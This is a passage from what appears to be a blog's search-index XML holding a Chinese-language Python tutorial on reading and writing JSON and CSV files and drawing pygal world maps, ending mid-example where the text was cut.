<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python爬蟲(第一章,第二章)</title>
      <link href="/2024/02/06/python%E7%88%AC%E8%9F%B2-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
      <url>/2024/02/06/python%E7%88%AC%E8%9F%B2-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="python網路爬蟲-一、二"><a href="#python網路爬蟲-一、二" class="headerlink" title="python網路爬蟲(一、二)"></a>python網路爬蟲(一、二)</h1><h2 id="資料格式"><a href="#資料格式" class="headerlink" title="資料格式"></a><strong>資料格式</strong></h2><h3 id="python-json格式"><a href="#python-json格式" class="headerlink" title="python-&gt;json格式"></a><strong>python-&gt;json格式</strong></h3><h4 id="dumps"><a href="#dumps" class="headerlink" title="dumps()"></a><strong>dumps()</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">list1=[1,2,3,4,5]</span><br><span class="line">tuple1=(6,7,8,9,10)</span><br><span class="line">dict1=&#123;&quot;aaaa&quot;:123&#125;</span><br><span class="line">str1=&quot;123456&quot;</span><br><span class="line">a=1</span><br><span class="line">b=1.2</span><br><span class="line">c=1456789876567898765567876222222222222222222222222222222</span><br><span class="line">T=True</span><br><span class="line">F=False</span><br><span class="line">d=None</span><br><span class="line">print(json.dumps(list1))</span><br><span class="line">print(json.dumps(tuple1))</span><br><span class="line">print(json.dumps(str1))</span><br><span class="line">print(json.dumps(dict1))</span><br><span class="line">print(json.dumps(a))</span><br><span class="line">print(json.dumps(b))</span><br><span class="line">print(json.dumps(c))</span><br><span class="line">print(json.dumps(T))</span><br><span class="line">print(json.dumps(d))</span><br><span class="line">print(json.dumps(F))</span><br></pre></td></tr></table></figure><h4 id="python-json格式-1"><a href="#python-json格式-1" class="headerlink" title="python-&gt;json格式"></a><strong>python-&gt;json格式</strong></h4><table><thead><tr><th>python資料</th><th>JSON資料</th></tr></thead><tbody><tr><td>dict</td><td>object</td></tr><tr><td>list,tuple</td><td>array</td></tr><tr><td>str,unicode</td><td>string</td></tr><tr><td>int,float,long</td><td>nuumber</td></tr><tr><td>True</td><td>true</td></tr><tr><td>False</td><td>false</td></tr><tr><td>None</td><td>null</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obj1=[&#123;&#x27;name&#x27;:&#x27;ray&#x27;,&#x27;Age&#x27;:20,&#x27;size&#x27;:&#x27;L&#x27;&#125;]</span><br><span class="line">jobj1=json.dumps(obj1)</span><br><span class="line">print(obj1)</span><br><span class="line">print(jobj1)</span><br></pre></td></tr></table></figure><blockquote><p><strong>note:</strong></p><ol><li>json字串是用雙引號</li></ol></blockquote><h4 id="dumps-的sort-key參數"><a href="#dumps-的sort-key參數" class="headerlink" title="dumps()的sort_key參數"></a><strong>dumps()的sort_key參數</strong></h4><blockquote><p>轉成json時，鍵排序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obj1=[&#123;&#x27;a&#x27;:1,&#x27;c&#x27;:2,&#x27;d&#x27;:3,&#x27;b&#x27;:4&#125;]</span><br><span class="line">jobj1=json.dumps(obj1)</span><br><span class="line">jobj1_sort=json.dumps(obj1,sort_keys=True)</span><br><span class="line">print(jobj1)</span><br><span class="line">print(jobj1_sort)</span><br></pre></td></tr></table></figure><h4 id="dumps-的indent參數"><a href="#dumps-的indent參數" class="headerlink" title="dumps()的indent參數"></a><strong>dumps()的indent參數</strong></h4><blockquote><p>轉成json時，設定縮排使其容易閱讀</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">obj1=[&#123;&#x27;a&#x27;:1,&#x27;c&#x27;:2,&#x27;d&#x27;:3,&#x27;b&#x27;:4&#125;]</span><br><span class="line">jobj1_indent=json.dumps(obj1,indent=True)</span><br><span class="line">print(jobj1_indent)</span><br></pre></td></tr></table></figure><h3 id="json-python格式"><a href="#json-python格式" class="headerlink" title="json-&gt;python格式"></a><strong>json-&gt;python格式</strong></h3><h4 id="loads"><a href="#loads" class="headerlink" title="loads()"></a><strong>loads()</strong></h4><table><thead><tr><th>JSON資料</th><th>python資料</th></tr></thead><tbody><tr><td>object</td><td>dict</td></tr><tr><td>array</td><td>list</td></tr><tr><td>string</td><td>unicode</td></tr><tr><td>nuumber(int)</td><td>int,long</td></tr><tr><td>nuumber(real)</td><td>float</td></tr><tr><td>true</td><td>True</td></tr><tr><td>false</td><td>False</td></tr><tr><td>null</td><td>None</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">jobj1=&#x27;&#123;&quot;a&quot;:1,&quot;c&quot;:2,&quot;d&quot;:3,&quot;b&quot;:4&#125;&#x27;</span><br><span class="line">obj1=json.loads(jobj1)</span><br><span class="line">print(obj1)</span><br><span class="line">print(type(obj1))</span><br></pre></td></tr></table></figure><h4 id="每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含"><a href="#每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含" class="headerlink" title="每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含"></a><strong>每個JSON文件只能放一個JSON物件，要放多個物件，可用一個父JSON包含</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">jobj1=&#x27;&#123;&quot;A&quot;:[&#123;&quot;a&quot;:1&#125;,&#123;&quot;b&quot;:2&#125;]&#125;&#x27;</span><br><span class="line">obj1=json.loads(jobj1)</span><br><span class="line">print(obj1)</span><br><span class="line">print(obj1[&quot;A&quot;])</span><br><span class="line">print(obj1[&quot;A&quot;][1])</span><br><span class="line">print(obj1[&quot;A&quot;][1][&quot;b&quot;])</span><br></pre></td></tr></table></figure><h4 id="將字典寫入json"><a href="#將字典寫入json" class="headerlink" title="將字典寫入json"></a><strong>將字典寫入json</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">dict1=&#123;&#x27;a&#x27;:1,&#x27;c&#x27;:2,&#x27;d&#x27;:3,&#x27;b&#x27;:4&#125;</span><br><span class="line">fn=&quot;將字典寫入json檔.json&quot;</span><br><span class="line">with open(fn,&#x27;w&#x27;) as f:</span><br><span class="line">    json.dump(dict1,f,sort_keys=True,indent=True)</span><br></pre></td></tr></table></figure><blockquote><p>寫入中文時，encoding&#x3D;’utf-8’，且indent&#x3D;2, ensure_ascii&#x3D;False</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">objlist = [&#123;&quot;日本&quot;:&quot;Japan&quot;, &quot;首都&quot;:&quot;Tykyo&quot;&#125;,</span><br><span class="line">           &#123;&quot;美州&quot;:&quot;USA&quot;, &quot;首都&quot;:&quot;Washington&quot;&#125;]</span><br><span class="line"></span><br><span class="line">fn = &#x27;out1_9_2.json&#x27;</span><br><span class="line">with open(fn, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fnObj:</span><br><span class="line">    json.dump(objlist, fnObj, indent=2, ensure_ascii=False)</span><br></pre></td></tr></table></figure><h4 id="讀取json檔案"><a href="#讀取json檔案" class="headerlink" title="讀取json檔案"></a><strong>讀取json檔案</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">      </span><br><span class="line">fn = &#x27;out1_9.json&#x27;</span><br><span class="line">with open(fn, &#x27;r&#x27;) as fnObj:</span><br><span class="line">    data = json.load(fnObj)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line">print(type(data))</span><br></pre></td></tr></table></figure><h4 id="應用"><a href="#應用" class="headerlink" title="應用"></a><strong>應用</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fn=&#x27;login.json&#x27;</span><br><span class="line">user=input(&quot;輸入使用者名稱 : &quot;)</span><br><span class="line">with open(fn,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    json.dump(user,file,ensure_ascii=False)</span><br><span class="line">    print(&quot;%s 歡迎使用本系統。&quot;%user)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fn=&#x27;login.json&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    login=json.load(file)</span><br><span class="line">    print(&quot;%s 歡迎回來&quot; %login)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">fn=&#x27;login_ch1_13_2.json&#x27;</span><br><span class="line">try:</span><br><span class="line">    with open(fn,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">        login=json.load(file)</span><br><span class="line">        loginu=input(&quot;請輸入帳號 : &quot;)</span><br><span class="line">except Exception:</span><br><span class="line">    with open(fn,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">        login=input(&quot;新增帳號 : &quot;)</span><br><span class="line">        json.dump(login,file,ensure_ascii=False)</span><br><span class="line">        print(&quot;帳號已新增&quot;)</span><br><span class="line">else:</span><br><span class="line">    if loginu==login:</span><br><span class="line">        print(&quot;%s 歡迎回來&quot;%login)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;使用者名稱錯誤&quot;)</span><br></pre></td></tr></table></figure><h4 id="應用-建立世界地圖"><a href="#應用-建立世界地圖" class="headerlink" title="應用(建立世界地圖)"></a><strong>應用(建立世界地圖)</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pygal.maps.world</span><br><span class="line">worldmap=pygal.maps.world.World()</span><br><span class="line">worldmap.title=&#x27;world map&#x27;</span><br><span class="line">worldmap.add(&#x27;Asia&#x27;,[&#x27;jp&#x27;,&#x27;cn&#x27;,&#x27;tw&#x27;])</span><br><span class="line">worldmap.render_to_file(&#x27;out1_18_2.svg&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import pygal.maps.world</span><br><span class="line">from pygal.maps.world import COUNTRIES</span><br><span class="line">fn=&#x27;populations.json&#x27;</span><br><span class="line">def getcode(CountryName):</span><br><span class="line">    for a,b in COUNTRIES.items():</span><br><span class="line">        if b==CountryName:</span><br><span class="line">            return a</span><br><span class="line">    return None</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    datas=json.load(file)</span><br><span class="line">dict1=&#123;&#125;</span><br><span class="line">for data in datas:</span><br><span class="line">    if data[&#x27;Year&#x27;]==&#x27;2010&#x27;:</span><br><span class="line">        CountryName=data[&#x27;Country Name&#x27;]</span><br><span class="line">        Year=data[&#x27;Year&#x27;]</span><br><span class="line">        n=int(float(data[&#x27;Numbers&#x27;]))</span><br><span class="line">        wcode=getcode(CountryName)</span><br><span class="line">        if wcode!=None:</span><br><span class="line">            dict1[wcode]=n</span><br><span class="line"></span><br><span class="line">worldmap=pygal.maps.world.World()</span><br><span class="line">worldmap.title=&#x27;2010人口分布&#x27;</span><br><span class="line">worldmap.add(&#x27;2010&#x27;,dict1)</span><br><span class="line">worldmap.render_to_file(&#x27;out1_21_2.svg&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import pygal.maps.world</span><br><span class="line">from pygal.maps.world import COUNTRIES</span><br><span class="line">fn=&#x27;populations.json&#x27;</span><br><span class="line">def getcode(a):</span><br><span class="line">    for x,y in COUNTRIES.items():</span><br><span class="line">        if y==a:</span><br><span class="line">            return x</span><br><span class="line">    return None</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    datas=json.load(file)</span><br><span class="line">dict1=&#123;&#125;</span><br><span class="line">dict2=&#123;&#125;</span><br><span class="line">for data in datas:</span><br><span class="line">    if data[&#x27;Year&#x27;]==&#x27;2010&#x27;:</span><br><span class="line">        a=data[&#x27;Country Name&#x27;]</span><br><span class="line">        b=int(float(data[&#x27;Numbers&#x27;]))</span><br><span class="line">        c=getcode(a)</span><br><span class="line">        if c!=None:</span><br><span class="line">            if b&gt;=100000000:</span><br><span class="line">                dict1[c]=b</span><br><span class="line">            else:</span><br><span class="line">                dict2[c]=b</span><br><span class="line"></span><br><span class="line">worldmap=pygal.maps.world.World()</span><br><span class="line">worldmap.title=&#x27;2010&#x27;</span><br><span class="line">worldmap.add(&#x27;&gt;=100000000&#x27;,dict1)</span><br><span class="line">worldmap.add(&#x27;&lt;100000000&#x27;,dict2)</span><br><span class="line">worldmap.render_to_file(&#x27;out1_22_2.svg&#x27;)</span><br></pre></td></tr></table></figure><h3 id="csv"><a href="#csv" class="headerlink" title="csv"></a><strong>csv</strong></h3><h4 id="檔案開啟-reader"><a href="#檔案開啟-reader" class="headerlink" title="檔案開啟(reader())"></a>檔案開啟(reader())</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    datas=csv.reader(file)#指定跌代對象</span><br><span class="line">    pdata=list(datas)</span><br><span class="line">print(datas)</span><br><span class="line">print(pdata)</span><br></pre></td></tr></table></figure><blockquote><p>或者用for迴圈列印</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.reader(file)</span><br><span class="line">    for data in p:</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><blockquote><p>或者用for列印串列內容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.reader(file)</span><br><span class="line">    datas=list(p)</span><br><span class="line">for data in datas:</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure><blockquote><p>使用串列索引讀取csv</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvReport.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.reader(file)</span><br><span class="line">    datas=list(p)</span><br><span class="line">print(datas[0][0],datas[0][1])</span><br><span class="line">print(datas[1][0],datas[1][1])</span><br><span class="line">print(datas[3][0],datas[3][1])</span><br></pre></td></tr></table></figure><h4 id="檔案開啟-dictreader"><a href="#檔案開啟-dictreader" class="headerlink" title="檔案開啟(dictreader())"></a>檔案開啟(dictreader())</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvPeople.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    dict1=csv.DictReader(file)</span><br><span class="line">    for data in dict1:</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><blockquote><p>將檔案中的file name與last name印出來</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;csvPeople.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;) as file:</span><br><span class="line">    p=csv.DictReader(file)</span><br><span class="line">    print(p)</span><br><span class="line">    for data in p:</span><br><span class="line">        print(data[&#x27;first_name&#x27;],data[&#x27;last_name&#x27;])</span><br></pre></td></tr></table></figure><h4 id="寫入csv檔-writer"><a href="#寫入csv檔-writer" class="headerlink" title="寫入csv檔(writer)"></a>寫入csv檔(writer)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_7_2.csv&#x27;</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.writer(file)</span><br><span class="line">    writefile.writerow([&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;a&#x27;,&#x27;14&#x27;,&#x27;100&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;b&#x27;,&#x27;18&#x27;,&#x27;200&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;c&#x27;,&#x27;16&#x27;,&#x27;150&#x27;])</span><br></pre></td></tr></table></figure><h4 id="複製csv檔"><a href="#複製csv檔" class="headerlink" title="複製csv檔"></a>複製csv檔</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">rn=input(&#x27;複製檔案名:&#x27;)</span><br><span class="line">wn=input(&#x27;輸出檔案名:&#x27;)</span><br><span class="line">try:</span><br><span class="line">    with open(rn,&#x27;r&#x27;) as file:</span><br><span class="line">        p=csv.reader(file)</span><br><span class="line">        datas=list(p)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;未找到複製的檔案&quot;)</span><br><span class="line">else:</span><br><span class="line">    with open(wn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">        writefile=csv.writer(file)</span><br><span class="line">        for data in datas:</span><br><span class="line">            writefile.writerow(data)</span><br></pre></td></tr></table></figure><h4 id="delimiter改變csv的分隔符號"><a href="#delimiter改變csv的分隔符號" class="headerlink" title="delimiter改變csv的分隔符號"></a>delimiter改變csv的分隔符號</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_9_2.csv&#x27;</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.writer(file,delimiter=&#x27;\t&#x27;)</span><br><span class="line">    writefile.writerow([&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;a&#x27;,&#x27;14&#x27;,&#x27;100&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;b&#x27;,&#x27;18&#x27;,&#x27;200&#x27;])</span><br><span class="line">    writefile.writerow([&#x27;c&#x27;,&#x27;16&#x27;,&#x27;200&#x27;])</span><br></pre></td></tr></table></figure><h4 id="寫入csv檔-dictwrite"><a href="#寫入csv檔-dictwrite" class="headerlink" title="寫入csv檔(dictwrite)"></a>寫入csv檔(dictwrite)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_10_2.csv&#x27;</span><br><span class="line">list1=[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=list1)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    writefile.writerow(&#123;&#x27;name&#x27;:&#x27;a&#x27;,&#x27;age&#x27;:&#x27;18&#x27;,&#x27;high&#x27;:&#x27;100&#x27;&#125;)</span><br><span class="line">    writefile.writerow(&#123;&#x27;name&#x27;:&#x27;b&#x27;,&#x27;age&#x27;:&#x27;14&#x27;,&#x27;high&#x27;:&#x27;200&#x27;&#125;)</span><br><span class="line">    writefile.writerow(&#123;&#x27;name&#x27;:&#x27;c&#x27;,&#x27;age&#x27;:&#x27;16&#x27;,&#x27;high&#x27;:&#x27;150&#x27;&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>或用for輸入串列資料</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_3.csv&#x27;</span><br><span class="line">listd=[&#123;&#x27;name&#x27;:&#x27;a&#x27;,&#x27;age&#x27;:&#x27;18&#x27;,&#x27;high&#x27;:&#x27;100&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;b&#x27;,&#x27;age&#x27;:&#x27;14&#x27;,&#x27;high&#x27;:&#x27;200&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;c&#x27;,&#x27;age&#x27;:&#x27;16&#x27;,&#x27;high&#x27;:&#x27;150&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;d&#x27;,&#x27;age&#x27;:&#x27;19&#x27;,&#x27;high&#x27;:&#x27;300&#x27;&#125;]</span><br><span class="line">listh=[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=listh)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    for data in listd:</span><br><span class="line">        writefile.writerow(data)</span><br></pre></td></tr></table></figure><blockquote><p>writerows寫法:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_3.csv&#x27;</span><br><span class="line">listd=[&#123;&#x27;name&#x27;:&#x27;a&#x27;,&#x27;age&#x27;:&#x27;18&#x27;,&#x27;high&#x27;:&#x27;100&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;b&#x27;,&#x27;age&#x27;:&#x27;14&#x27;,&#x27;high&#x27;:&#x27;200&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;c&#x27;,&#x27;age&#x27;:&#x27;16&#x27;,&#x27;high&#x27;:&#x27;150&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;d&#x27;,&#x27;age&#x27;:&#x27;19&#x27;,&#x27;high&#x27;:&#x27;300&#x27;&#125;]</span><br><span class="line">listh=[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;high&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,newline=&#x27;&#x27;) as file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=listh)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    writefile.writerows(listd)</span><br></pre></td></tr></table></figure><blockquote><p>中文寫法:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_4.csv&#x27;</span><br><span class="line">listd=[&#123;&#x27;名字&#x27;:&#x27;小名&#x27;,&#x27;年齡&#x27;:&#x27;20&#x27;,&#x27;身高&#x27;:&#x27;100&#x27;&#125;,&#123;&#x27;名字&#x27;:&#x27;小華&#x27;,&#x27;年齡&#x27;:&#x27;21&#x27;,&#x27;身高&#x27;:&#x27;150&#x27;&#125;,&#123;&#x27;名字&#x27;:&#x27;小立&#x27;,&#x27;年齡&#x27;:&#x27;22&#x27;,&#x27;身高&#x27;:&#x27;200&#x27;&#125;]</span><br><span class="line">listh=[&#x27;名字&#x27;,&#x27;年齡&#x27;,&#x27;身高&#x27;]</span><br><span class="line">with open(fn,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;,newline=&#x27;&#x27;) as 